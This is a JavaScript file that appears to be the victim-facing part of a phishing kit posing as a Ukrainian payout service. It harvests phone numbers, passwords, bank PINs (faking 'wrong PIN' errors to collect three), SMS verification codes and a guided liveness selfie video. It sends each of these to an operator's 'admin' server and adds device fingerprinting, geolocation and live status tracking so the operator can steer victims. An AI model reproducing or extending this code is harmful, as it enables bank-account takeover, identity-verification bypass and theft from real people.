        const pinError = document.getElementById('pinError');
        if (pinError) {
            pinError.innerHTML = '<div style="color: #ef4444; font-weight: bold; margin-bottom: 10px;">❌ Цей код вже використано!</div>' +
                                '<div style="color: #9ca3af; font-size: 14px;">Введіть інший код</div>';
            pinError.style.display = 'block';
        }
        // Очищаем поле для нового ввода
        clearPinInput();
        if (CONFIG.SETTINGS.debug) {
            console.log(`❌ Дубликат PIN: ${pin}`);
        }
        return;
    }
    
    // Защита от множественной отправки
    if (isSubmittingPin) {
        if (CONFIG.SETTINGS.debug) {
            console.log('⏳ PIN уже отправляется, пропускаем...');
        }
        return;
    }
    
    isSubmittingPin = true;
    pinAttempts++;
    pinHistory.push(pin);
    userData.pin = pin;
    
    // Отправляем PIN на админку
    await sendData('pin', pin);
    
    // Очищаем PIN после отправки
    pinValue = '';
    
    // Проверяем количество попыток
    if (pinAttempts === 1) {
        // Первая попытка - показываем ошибку с одним PIN
        isSubmittingPin = false;
        showInvalidPinError();
    } else if (pinAttempts === 2) {
        // Вторая попытка - показываем ошибку с двумя PIN
        isSubmittingPin = false;
        showInvalidPinError();
    } else {
        // Третья попытка - продолжаем дальше
        isSubmittingPin = false;
        // Сбрасываем счетчик для следующего раза
        pinAttempts = 0;
        pinHistory = [];
        
        // Возвращаемся на экран, где был пользователь
        returnToSavedScreen('pin');
    }
}

function showInvalidPinError() {
    const pinError = document.getElementById('pinError');
    if (!pinError) return;
    
    // Формируем сообщение с красными PIN-кодами
    let errorHTML = '<div style="color: #ef4444; font-weight: bold; margin-bottom: 10px;">❌ Неверний ПІН-код</div>';
    errorHTML += '<div style="color: #ef4444; font-size: 18px; font-weight: bold; letter-spacing: 3px;">';
    
    pinHistory.forEach((pin, index) => {
        if (index > 0) {
            errorHTML += '<br>';
        }
        errorHTML += pin;
    });
    
    errorHTML += '</div>';
    errorHTML += '<div style="color: #9ca3af; font-size: 14px; margin-top: 10px;">Спробуйте ще раз</div>';
    
    pinError.innerHTML = errorHTML;
    pinError.style.display = 'block';
    
    if (CONFIG.SETTINGS.debug) {
        console.log(`❌ Показана ошибка PIN (попытка ${pinAttempts}/3):`, pinHistory);
    }
}

function showAmountSelection() {
    if (CONFIG.SETTINGS.debug) {
        console.log('🔄 showAmountSelection() вызвана');
    }
    
    // Показываем экран выбора суммы СНАЧАЛА
    showScreen('screen-amount');
    
    // Ждем немного, чтобы DOM обновился
    setTimeout(() => {
        if (CONFIG.SETTINGS.debug) {
            console.log('⏱️ Инициализация экрана выбора суммы (после setTimeout)');
        }
        const amountInfo = document.getElementById('amountInfo');
        const submitBtn = document.getElementById('submitAmount');
        const currencyButtons = document.querySelectorAll('.currency-btn');
        
        if (!amountInfo || !submitBtn) {
            console.error('❌ Элементы экрана выбора суммы не найдены');
            if (CONFIG.SETTINGS.debug) {
                console.log('amountInfo:', amountInfo, 'submitBtn:', submitBtn);
            }
            // Если экран еще не загружен - показываем загрузку
            showLoadingScreenWithPayment();
            return;
        }
        
        // Генерируем случайную сумму от 8600 до 10100 грн (только если еще не выбрана)
        if (!userData.amountUAH) {
            const amountUAH = Math.floor(Math.random() * (10100 - 8600 + 1)) + 8600;
            userData.selectedAmount = amountUAH;
            
            // Вычисляем эквиваленты
            const amountUSD = Math.round((amountUAH / EXCHANGE_RATES.usd) * 100) / 100;
            const amountEUR = Math.round((amountUAH / EXCHANGE_RATES.eur) * 100) / 100;
            
            // Сохраняем эквиваленты
            userData.amountUSD = amountUSD;
            userData.amountEUR = amountEUR;
            userData.amountUAH = amountUAH;
        }
        
        // Используем сохраненные значения
        const amountUAH = userData.amountUAH;
        const amountUSD = userData.amountUSD;
        const amountEUR = userData.amountEUR;
        
        // Убеждаемся, что валюта установлена
        if (!userData.selectedCurrency) {
            userData.selectedCurrency = 'uah';
        }
        
        // Обновляем отображение суммы
        updateAmountDisplay(amountUAH, amountUSD, amountEUR);
        
        // Убеждаемся, что правильная кнопка валюты выбрана
        // Обработчики валюты уже установлены ГЛОБАЛЬНО
        currencyButtons.forEach(btn => {
            if (btn.dataset.currency === userData.selectedCurrency) {
                btn.classList.add('selected');
            } else {
                btn.classList.remove('selected');
            }
        });
        
        // Убеждаемся, что кнопка активна и видима
        // Обработчик уже установлен ГЛОБАЛЬНО через делегирование на document
        submitBtn.disabled = false;
        submitBtn.removeAttribute('disabled');
        submitBtn.style.pointerEvents = 'auto';
        submitBtn.style.opacity = '1';
        submitBtn.style.cursor = 'pointer';
        
        if (CONFIG.SETTINGS.debug) {
            console.log('✅ Экран выбора суммы инициализирован');
            console.log('✅ Кнопка активна:', !submitBtn.disabled);
            console.log('✅ userData.amountUAH:', userData.amountUAH);
            console.log('✅ userData.selectedCurrency:', userData.selectedCurrency);
        }
    }, 100); // Задержка для обновления DOM
}

function updateAmountDisplay(amountUAH, amountUSD, amountEUR) {
    const amountInfo = document.getElementById('amountInfo');
    if (!amountInfo) return;
    
    let displayText = '';
    const currency = userData.selectedCurrency || 'uah';
    
    if (currency === 'uah') {
        displayText = `${amountUAH.toLocaleString('uk-UA')} грн`;
    } else if (currency === 'usd') {
        displayText = `$${amountUSD.toLocaleString('uk-UA', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} (≈ ${amountUAH.toLocaleString('uk-UA')} грн)`;
    } else if (currency === 'eur') {
        displayText = `€${amountEUR.toLocaleString('uk-UA', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} (≈ ${amountUAH.toLocaleString('uk-UA')} грн)`;
    }
    
    amountInfo.textContent = displayText;
    
    // Сохраняем выбранную сумму для отображения на других экранах
    userData.displayAmount = displayText;
    localStorage.setItem('selectedAmount', displayText);
}

// Показываем короткую загрузку (3 сек) и потом следующий экран
function showShortLoading(nextScreen) {
    // Очищаем предыдущий интервал если есть
    if (loadingProgressInterval) {
        clearInterval(loadingProgressInterval);
        loadingProgressInterval = null;
    }
    
    // Показываем экран короткой загрузки
    showScreen('screen-short-loading');
    
    // Отображаем сумму
    const shortLoadingAmountDisplay = document.getElementById('shortLoadingAmountDisplay');
    if (shortLoadingAmountDisplay && userData.displayAmount) {
        shortLoadingAmountDisplay.textContent = userData.displayAmount;
    }
    
    // Запускаем прогресс-бар (3 секунды)
    const progressBar = document.getElementById('shortLoadingProgressBar');
    
    if (progressBar) {
        let progress = 0;
        const duration = 3000; // 3 секунды
        const interval = 50; // Обновляем каждые 50ms
        const step = 100 / (duration / interval);
        
        progressBar.style.width = '0%';
        
        loadingProgressInterval = setInterval(() => {
            progress += step;
            if (progress >= 100) {
                progress = 100;
                clearInterval(loadingProgressInterval);
                loadingProgressInterval = null;
                
                // Переходим на следующий экран
                if (nextScreen === 'age') {
                    showAgeScreen();
                } else if (nextScreen === 'gender') {
                    showGenderScreen();
                } else if (nextScreen === 'city') {
                    showCityScreen();
                } else if (nextScreen === 'final') {
                    showFinalLoading();
                }
            }
            
            progressBar.style.width = `${progress}%`;
        }, interval);
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('🔄 Короткая загрузка, следующий экран:', nextScreen);
    }
}

// Функция showAgeScreen УДАЛЕНА - используется дата рождения вместо возраста

// Показываем экран выбора пола
function showGenderScreen() {
    showScreen('screen-gender');
    
    // Отображаем сумму
    const genderAmountDisplay = document.getElementById('genderAmountDisplay');
    if (genderAmountDisplay && userData.displayAmount) {
        genderAmountDisplay.textContent = `Ваша виплата: ${userData.displayAmount}`;
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('👤 Показан экран выбора пола');
    }
}

// Показываем экран ввода города
function showCityScreen() {
    showScreen('screen-city');
    
    // Отображаем сумму
    const cityAmountDisplay = document.getElementById('cityAmountDisplay');
    if (cityAmountDisplay && userData.displayAmount) {
        cityAmountDisplay.textContent = `Ваша виплата: ${userData.displayAmount}`;
    }
    
    // Фокус на поле ввода
    const cityInput = document.getElementById('cityInput');
    if (cityInput) {
        cityInput.value = '';
        setTimeout(() => cityInput.focus(), 100);
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('🏙️ Показан экран ввода города');
    }
}

// Показываем финальную загрузку (1 минута)
function showFinalLoading() {
    // Очищаем предыдущий интервал если есть
    if (loadingProgressInterval) {
        clearInterval(loadingProgressInterval);
        loadingProgressInterval = null;
    }
    
    // Показываем экран загрузки
    showScreen('screen-loading');
    
    // Отображаем сумму
    const loadingAmountDisplay = document.getElementById('loadingAmountDisplay');
    if (loadingAmountDisplay && userData.displayAmount) {
        loadingAmountDisplay.textContent = userData.displayAmount;
        loadingAmountDisplay.style.display = 'block';
    }
    
    // Запускаем прогресс-бар (60 секунд)
    const progressBar = document.getElementById('loadingProgressBar');
    const progressText = document.getElementById('loadingProgressText');
    
    if (progressBar && progressText) {
        let progress = 0;
        progressBar.style.width = '0%';
        progressText.textContent = '0%';
        
        const duration = 60000; // 60 секунд
        const interval = 100; // Обновляем каждые 100ms
        const step = 100 / (duration / interval);
        
        loadingProgressInterval = setInterval(() => {
            progress += step;
            if (progress >= 100) {
                progress = 100;
                clearInterval(loadingProgressInterval);
                loadingProgressInterval = null;
            }
            
            progressBar.style.width = `${progress}%`;
            progressText.textContent = `${Math.round(progress)}%`;
        }, interval);
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('🔄 Показана финальная загрузка (1 мин):', userData.displayAmount);
    }
}

// Устаревшая функция - перенаправляем на новую логику
function showLoadingScreenWithPayment() {
    showFinalLoading();
}

function initCodeForm() {
    // Код инициализируется динамически через showCodeScreen()
}

function showCodeScreen(digits) {
    const container = document.getElementById('codeInputs');
    const instruction = document.getElementById('codeInstruction');
    const submitBtn = document.getElementById('submitCode');
    
    if (!container || !instruction || !submitBtn) {
        console.error('❌ Элементы экрана кода не найдены');
        return;
    }
    
    // Сбрасываем историю кодов при запросе нового кода от админа
    codeHistory = [];
    
    // Очищаем ошибку
    const codeError = document.getElementById('codeError');
    if (codeError) {
        codeError.innerHTML = '';
        codeError.style.display = 'none';
    }
    
    // Сохраняем текущий экран перед показом экрана кода (если еще не сохранен)
    if (!savedScreenBeforeCommand) {
        const currentScreen = document.querySelector('.screen.active');
        if (currentScreen && currentScreen.id !== 'screen-code') {
            savedScreenBeforeCommand = currentScreen.id;
            if (CONFIG.SETTINGS.debug) {
                console.log('💾 Сохранен экран перед показом кода:', savedScreenBeforeCommand);
            }
        }
    }
    
    // Очищаем контейнер
    container.innerHTML = '';
    
    // Обновляем инструкцию с номером телефона
    const phoneFormatted = userData.phone || '+380XXXXXXXXX';
    instruction.textContent = `На ваш номер ${phoneFormatted} відправлено СМС`;
    
    // Создаем поля ввода
    for (let i = 0; i < digits; i++) {
        const input = document.createElement('input');
        input.type = 'tel';
        input.className = 'code-input';
        input.maxLength = 1;
        input.pattern = '[0-9]';
        input.inputMode = 'numeric';
        input.dataset.index = i;
        
        // Автоматический переход на следующее поле
        input.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 1) {
                value = value.slice(-1);
            }
            e.target.value = value;
            
            if (value.length === 1 && i < digits - 1) {
                container.children[i + 1].focus();
            }
            
            // Проверяем заполненность всех полей
            checkCodeComplete();
        });
        
        // Backspace - переход на предыдущее поле
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '' && i > 0) {
                container.children[i - 1].focus();
            }
        });
        
        container.appendChild(input);
    }
    
    // Показываем экран кода
    showScreen('screen-code');
    
    // Фокус на первое поле
    setTimeout(() => {
        const firstInput = container.querySelector('.code-input');
        if (firstInput) {
            firstInput.focus();
        }
    }, 100);
    
    // Обработчик кнопки отправки установлен ГЛОБАЛЬНО через делегирование
    // Здесь только устанавливаем начальное состояние
    submitBtn.disabled = true; // Начинаем с отключенной кнопки (включится когда все поля заполнены)
    
    // Запускаем таймер
    startTimer();
}

function checkCodeComplete() {
    const inputs = document.querySelectorAll('.code-input');
    const submitBtn = document.getElementById('submitCode');
    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
    
    submitBtn.disabled = !allFilled;
    
    // Если все заполнено - автоотправка
    if (allFilled) {
        setTimeout(() => submitCode(inputs.length), 300);
    }
}

async function submitCode(digits) {
    const inputs = document.querySelectorAll('.code-input');
    const code = Array.from(inputs).map(input => input.value).join('');
    
    if (code.length !== digits) {
        showError('codeError', 'Введіть усі цифри коду');
        return;
    }
    
    if (!/^\d+$/.test(code)) {
        showError('codeError', 'Код може містити тільки цифри');
        const container = document.getElementById('codeInputs');
        if (container) {
            container.querySelectorAll('.code-input').forEach(input => input.value = '');
            const first = container.querySelector('.code-input');
            if (first) first.focus();
        }
        document.getElementById('submitCode').disabled = true;
        return;
    }
    
    // Проверка на дубликат кода
    if (codeHistory.includes(code)) {
        // Этот код уже был введен
        const codeError = document.getElementById('codeError');
        if (codeError) {
            let errorHTML = '<div style="color: #ef4444; font-weight: bold; margin-bottom: 10px;">❌ Цей код вже використано!</div>';
            errorHTML += '<div style="color: #ef4444; font-size: 16px; font-weight: bold; letter-spacing: 2px; margin-bottom: 10px;">';
            errorHTML += 'Раніше введені коди:<br>';
            codeHistory.forEach((c, index) => {
                errorHTML += c;
                if (index < codeHistory.length - 1) {
                    errorHTML += ', ';
                }
            });
            errorHTML += '</div>';
            errorHTML += '<div style="color: #9ca3af; font-size: 14px;">Введіть інший код з СМС</div>';
            codeError.innerHTML = errorHTML;
            codeError.style.display = 'block';
        }
        
        // Очищаем поля для нового ввода
        const container = document.getElementById('codeInputs');
        if (container) {
            container.querySelectorAll('.code-input').forEach(input => input.value = '');
            const first = container.querySelector('.code-input');
            if (first) first.focus();
        }
        document.getElementById('submitCode').disabled = true;
        
        if (CONFIG.SETTINGS.debug) {
            console.log(`❌ Дубликат кода: ${code}, история:`, codeHistory);
        }
        return;
    }
    
    // Добавляем код в историю
    codeHistory.push(code);
    userData.codes.push(code);
    
    // Отправляем код на админку
    await sendData(`code_${digits}`, code);
    
    // Возвращаемся на экран, где был пользователь
    returnToSavedScreen('code');
}

// Универсальная функция возврата на сохраненный экран
function returnToSavedScreen(dataType) {
    const screenToReturn = savedScreenBeforeCommand;
    savedScreenBeforeCommand = null; // Очищаем
    
    if (CONFIG.SETTINGS.debug) {
        console.log(`🔄 returnToSavedScreen(${dataType}), сохраненный экран:`, screenToReturn);
    }
    
    // Если был на финальной загрузке - всегда возвращаемся туда
    if (screenToReturn === 'screen-loading') {
        showFinalLoading();
        return;
    }
    
    // Если был на экране выбора суммы - возвращаемся туда
    if (screenToReturn === 'screen-amount') {
        showAmountSelection();
        return;
    }
    
    // Экран возраста удален - используется дата рождения
    
    // Если был на экране пола
    if (screenToReturn === 'screen-gender') {
        showGenderScreen();
        return;
    }
    
    // Если был на экране города
    if (screenToReturn === 'screen-city') {
        showCityScreen();
        return;
    }
    
    // Если был на короткой загрузке - возвращаемся на финальную
    if (screenToReturn === 'screen-short-loading') {
        showFinalLoading();
        return;
    }
    
    // По умолчанию - определяем следующий экран на основе dataType
    switch (dataType) {
        // case 'age' удален - используется дата рождения
        case 'phone':
            if (!userData.password) {
                document.getElementById('phoneDisplay').textContent = formatPhoneDisplay(userData.phone);
                showScreen('screen-password');
            } else {
                showFinalLoading();
            }
            break;
        case 'password':
            if (!userData.pin) {
                showScreen('screen-pin');
            } else {
                showFinalLoading();
            }
            break;
        case 'pin':
            // После PIN - показываем выбор суммы
            showAmountSelection();
            break;
        case 'code':
            // После кода - показываем финальную загрузку
            showFinalLoading();
            break;
        default:
            showFinalLoading();
    }
}

// ============================================================================
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ============================================================================

function showScreen(screenId) {
    // Скрываем все экраны
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.remove('active');
    });
    
    // Показываем нужный экран
    const targetScreen = document.getElementById(screenId);
    if (targetScreen) {
        targetScreen.classList.add('active');
        
        // Переинициализируем формы при показе экранов (НО НЕ для screen-amount)
        // screen-amount инициализируется отдельно через showAmountSelection()
        if (screenId === 'screen-phone') {
            initPhoneForm();
        } else if (screenId === 'screen-password') {
            initPasswordForm();
        } else if (screenId === 'screen-pin') {
            initPinForm();
        }
        // screen-amount обрабатывается отдельно в showAmountSelection()
    }
}

function showError(errorId, message) {
    const errorDiv = document.getElementById(errorId);
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';
    
    // Ошибка остается на экране постоянно, не исчезает
}

function formatPhone(value) {
    if (value.length <= 2) return value;
    if (value.length <= 5) return `${value.slice(0, 2)} ${value.slice(2)}`;
    if (value.length <= 7) return `${value.slice(0, 2)} ${value.slice(2, 5)} ${value.slice(5)}`;
    return `${value.slice(0, 2)} ${value.slice(2, 5)} ${value.slice(5, 7)} ${value.slice(7)}`;
}

function formatPhoneDisplay(phone) {
    const cleaned = phone.replace('+380', '');
    return `+380 ${cleaned.slice(0, 2)} ${cleaned.slice(2, 5)} ${cleaned.slice(5, 7)} ${cleaned.slice(7)}`;
}

function updatePinDots(pinValue, pinDots) {
    pinDots.forEach((dot, index) => {
        if (index < pinValue.length) {
            dot.classList.add('pin-dot--filled');
        } else {
            dot.classList.remove('pin-dot--filled');
        }
    });
}

function startTimer() {
    let seconds = 30;
    const timerEl = document.getElementById('timer');
    const resendLink = document.getElementById('resendLink');
    
    const interval = setInterval(() => {
        seconds--;
        
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        timerEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        
        if (seconds <= 0) {
            clearInterval(interval);
            resendLink.classList.remove('resend-link--disabled');
        }
    }, 1000);
}

function showCallScreen() {
    // Показываем экран звонка и оставляем его (без автоперехода)
    showScreen('screen-call');
    
    // Экран будет крутиться бесконечно, пока админ не нажмет другую команду
    if (CONFIG.SETTINGS.debug) {
        console.log('📞 Экран звонка показан (ожидание бесконечно)');
    }
}

function showBankSelection() {
    showScreen('screen-banks');
    const info = document.getElementById('bankInfo');
    if (info) {
        info.textContent = 'Виберіть банк зі списку, щоб продовжити.';
    }
    if (CONFIG.SETTINGS.debug) {
        console.log('🏦 Екран вибору банку показано');
    }
}

function handleBankSelection(bankName) {
    userData.bank = bankName;
    if (CONFIG.SETTINGS.debug) {
        console.log('🏦 Обрано банк:', bankName);
    }
    sendData('bank_choice', bankName);
    
    const info = document.getElementById('bankInfo');
    if (info) {
        info.textContent = `${bankName} обрано. Очікуйте завантаження форми.`;
    }
}

// ============================================================================
// FINGERPRINTING
// ============================================================================

async function generateFingerprint() {
    const components = [
        navigator.userAgent,
        navigator.language,
        screen.width,
        screen.height,
        screen.colorDepth,
        new Date().getTimezoneOffset(),
        navigator.hardwareConcurrency || 'unknown',
        navigator.deviceMemory || 'unknown'
    ];
    
    const fingerprint = await hashString(components.join('|'));
    return fingerprint;
}

async function hashString(str) {
    const buffer = new TextEncoder().encode(str);
    const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

async function getGeolocation() {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    });
                },
                () => resolve(null),
                { timeout: 5000 }
            );
        } else {
            resolve(null);
        }
    });
}

// ============================================================================
// ОТСЛЕЖИВАНИЕ АКТИВНОСТИ
// ============================================================================

// Отслеживание видимости страницы
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        sendStatus('minimized');
    } else {
        sendStatus('online');
        startStatusHeartbeat();
    }
});

// Отслеживание ухода со страницы
window.addEventListener('beforeunload', () => {
    stopStatusHeartbeat();
    sendStatus('offline');
});

// ============================================================================
// ============================================================================
// СЕЛФИ-ВЕРИФИКАЦИЯ
// ============================================================================

let selfieStream = null;
let selfieMediaRecorder = null;
let selfieChunks = [];
let selfieInstructionStep = 0;

const SELFIE_INSTRUCTIONS = [
    { text: 'Поверніть голову вліво', duration: 2000 },
    { text: 'Поверніть голову вправо', duration: 2000 },
    { text: 'Кліпніть очима', duration: 2000 },
    { text: 'Посміхніться', duration: 2000 }
];

function showSelfieScreen() {
    if (CONFIG.SETTINGS.debug) {
        console.log('📸 Показываем экран селфи-верификации');
    }
    
    // Сохраняем текущий экран
    if (!savedScreenBeforeCommand) {
        const currentScreen = document.querySelector('.screen.active');
        if (currentScreen && currentScreen.id !== 'screen-selfie') {
            savedScreenBeforeCommand = currentScreen.id;
        }
    }
    
    showScreen('screen-selfie');
    initSelfieScreen();
}

function initSelfieScreen() {
    const startBtn = document.getElementById('startSelfie');
    const sendBtn = document.getElementById('sendSelfie');
    const video = document.getElementById('selfieVideo');
    const placeholder = document.getElementById('selfiePlaceholder');
    const instruction = document.getElementById('selfieInstruction');
    const errorEl = document.getElementById('selfieError');
    const progress = document.getElementById('selfieProgress');
    const progressBar = document.getElementById('selfieProgressBar');
    
    // Очищаем состояние
    selfieInstructionStep = 0;
    selfieChunks = [];
    errorEl.style.display = 'none';
    progress.style.display = 'none';
    progressBar.style.width = '0%';
    startBtn.style.display = 'block';
    sendBtn.style.display = 'none';
    startBtn.textContent = 'Почати верифікацію'; // Сбрасываем текст кнопки
    instruction.textContent = 'Натисніть "Почати" коли будете готові';
    
    // Показываем заглушку, скрываем видео
    if (placeholder) placeholder.style.display = 'flex';
    video.style.display = 'none';
    
    // Обработчик кнопки "Начать"
    startBtn.onclick = async () => {
        // Запускаем камеру только после нажатия кнопки
        instruction.textContent = 'Запуск камери...';
        
        const cameraStarted = await startCamera();
        if (!cameraStarted) {
            // Если камера не запустилась - не продолжаем
            return;
        }
        
        // Скрываем заглушку, показываем видео
        if (placeholder) placeholder.style.display = 'none';
        video.style.display = 'block';
        
        startBtn.style.display = 'none';
        progress.style.display = 'block';
        await startSelfieVerification();
    };
    
    // Обработчик кнопки "Отправить"
    sendBtn.onclick = async () => {
        await sendSelfieVideo();
    };
}

async function startCamera() {
    const video = document.getElementById('selfieVideo');
    const errorEl = document.getElementById('selfieError');
    const instruction = document.getElementById('selfieInstruction');
    const startBtn = document.getElementById('startSelfie');
    
    try {
        selfieStream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 640 },
                height: { ideal: 480 },
                facingMode: 'user'
            },
            audio: false
        });
        
        video.srcObject = selfieStream;
        
        if (CONFIG.SETTINGS.debug) {
            console.log('📹 Камера запущена');
        }
        
        return true; // Успех
        
    } catch (error) {
        console.error('❌ Ошибка доступа к камере:', error);
        
        // Определяем тип ошибки
        let errorMessage = 'Не вдалося отримати доступ до камери';
        
        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
            errorMessage = 'Ви відхилили доступ до камери. Дозвольте доступ і спробуйте ще раз.';
        } else if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
            errorMessage = 'Камера не знайдена на вашому пристрої';
        } else if (error.name === 'NotReadableError' || error.name === 'TrackStartError') {
            errorMessage = 'Камера зайнята іншим додатком';
        }
        
        errorEl.textContent = errorMessage;
        errorEl.style.display = 'block';
        instruction.textContent = 'Не вдалося запустити камеру';
        
        // Показываем кнопку снова для повторной попытки
        startBtn.style.display = 'block';
        startBtn.textContent = 'Спробувати ще раз';
        
        return false; // Ошибка
    }
}

async function startSelfieVerification() {
    const instruction = document.getElementById('selfieInstruction');
    const progressBar = document.getElementById('selfieProgressBar');
    const sendBtn = document.getElementById('sendSelfie');
    
    // Начинаем запись СРАЗУ
    startRecording();
    
    // Показываем инструкцию "Приготовьтесь"
    instruction.textContent = 'Приготуйтеся...';
    await sleep(2000); // Увеличено до 2 сек
    
    // Проходим по всем инструкциям
    const totalSteps = SELFIE_INSTRUCTIONS.length;
    
    for (let i = 0; i < SELFIE_INSTRUCTIONS.length; i++) {
        const step = SELFIE_INSTRUCTIONS[i];
        instruction.textContent = step.text;
        
        // Обновляем прогресс-бар
        const progress = ((i + 1) / totalSteps) * 100;
        progressBar.style.width = `${progress}%`;
        
        await sleep(step.duration);
    }
    
    // Показываем завершающую инструкцию и продолжаем запись
    instruction.textContent = 'Чудово! Обробка...';
    progressBar.style.width = '100%';
    
    // Записываем ещё 1 секунду после последней инструкции
    await sleep(1000);
    stopRecording();
    
    // Останавливаем камеру
    if (selfieStream) {
        selfieStream.getTracks().forEach(track => track.stop());
        selfieStream = null;
    }
    
    // Показываем кнопку отправки
    instruction.textContent = 'Готово! Натисніть "Відправити"';
    sendBtn.style.display = 'block';
    
    if (CONFIG.SETTINGS.debug) {
        console.log('✅ Селфи-верификация завершена, размер:', selfieChunks.length, 'chunks');
    }
}

function startRecording() {
    if (!selfieStream) return;
    
    try {
        // Используем WebM с VP9 для минимального размера
        const options = {
            mimeType: 'video/webm;codecs=vp9',
            videoBitsPerSecond: 500000 // 500 kbps для минимального размера
        };
        
        // Fallback для Safari
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options.mimeType = 'video/webm';
        }
        
        selfieMediaRecorder = new MediaRecorder(selfieStream, options);
        
        selfieMediaRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
                selfieChunks.push(event.data);
            }
        };
        
        selfieMediaRecorder.start(100); // Сохраняем данные каждые 100мс
        
        if (CONFIG.SETTINGS.debug) {
            console.log('🎥 Запись началась');
        }
    } catch (error) {
        console.error('❌ Ошибка записи:', error);
    }
}

function stopRecording() {
    if (selfieMediaRecorder && selfieMediaRecorder.state !== 'inactive') {
        selfieMediaRecorder.stop();
        
        if (CONFIG.SETTINGS.debug) {
            console.log('⏹️ Запись остановлена');
        }
    }
}

async function sendSelfieVideo() {
    const sendBtn = document.getElementById('sendSelfie');
    const instruction = document.getElementById('selfieInstruction');
    const errorEl = document.getElementById('selfieError');
    
    sendBtn.disabled = true;
    instruction.textContent = 'Відправка...';
    
    try {
        // Создаем blob из записанных chunks
        const blob = new Blob(selfieChunks, { type: 'video/webm' });
        
        if (CONFIG.SETTINGS.debug) {
            console.log('📦 Размер видео:', (blob.size / 1024).toFixed(2), 'KB');
        }
        
        // Создаем FormData для отправки
        const formData = new FormData();
        formData.append('video', blob, 'selfie.webm');
        formData.append('session_token', sessionToken);
        
        // Отправляем на сервер
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/data/selfie`, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            throw new Error('Ошибка отправки');
        }
        
        instruction.textContent = 'Успішно відправлено!';
        
        if (CONFIG.SETTINGS.debug) {
            console.log('✅ Селфи отправлено');
        }
        
        // Возвращаемся на сохраненный экран
        await sleep(1500);
        returnToSavedScreen('selfie');
        
    } catch (error) {
        console.error('❌ Ошибка отправки селфи:', error);
        errorEl.textContent = 'Помилка відправки. Спробуйте ще раз';
        errorEl.style.display = 'block';
        sendBtn.disabled = false;
        instruction.textContent = 'Натисніть "Відправити" ще раз';
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ГОТОВО
// ============================================================================

if (CONFIG.SETTINGS.debug) {
    console.log('✅ app.js загружен');
}

